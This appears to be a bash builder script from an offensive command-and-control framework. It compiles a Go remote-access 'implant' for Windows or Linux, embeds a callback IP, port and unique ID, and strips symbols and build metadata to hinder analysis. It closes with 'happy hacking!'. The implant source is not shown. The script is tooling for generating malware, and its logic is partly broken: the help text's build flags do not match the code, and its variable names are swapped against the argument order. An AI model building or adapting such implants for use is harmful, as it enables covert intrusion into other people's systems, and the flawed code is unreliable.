#!/bin/bash
#generates a single implant with a UUID from dev/urandom and given user inputs (ip, portnum, name).
#"""cool""" banner to show. (I stole it from ASCII fonts)
echo "
  ________ ________                 
 /  _____/ \_____  \_______   ____  
/   \  ___  /   |   \_  __ \_/ __ \ 
\    \_\  \/    |    \  | \/\  ___/ 
 \______  /\_______  /__|    \___  >
        \/         \/            \/ 
    "

if [ $# -ne 4 ] || [ "$1" == "-h" ]; then
    echo "
    [:] This script is invoked as '$0 <ip/hostname> <port> <name> <build flag>' and needs each of these arguments to correctly run. 
    [:] you can see this help text by invoking the '-h' flag
    [:] OS flags are 'win' for windows builds, and none or 'lin' for linux builds

    [-] Build flags
        -w  Windows build

        -l  Linux build 
    "
    exit 0
fi
#this only makes a string with length 32, keep in mind the Birthday Paradox. with 61K implants, the chance of collision when generating a new implant 
#is ~35%. The solution is to make UUID's bigger, with size 64 instead of 32 for example.
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
#I don't really use these, but I have them just in case.
PORT=$1
IP=$2
NAME=$3
BUILD=$4
echo "[:]UUID for this implant: $NEW_UUID"
if [ $BUILD == "win" ]; then
    env GOOS=windows go build -o $3 -ldflags="-X 'main.uuid=$NEW_UUID' -X 'main.ip=$1' -X 'main.port_str=$2' -X 'main.build=$4' -w -s -buildid=" -trimpath ./implant/implant.go
else
    go build -o $3 -ldflags="-X 'main.uuid=$NEW_UUID' -X 'main.ip=$1' -X 'main.port_str=$2' -w -s -buildid=" -trimpath ./implant/implant.go
fi
echo "[+] implant generated, happy hacking!"
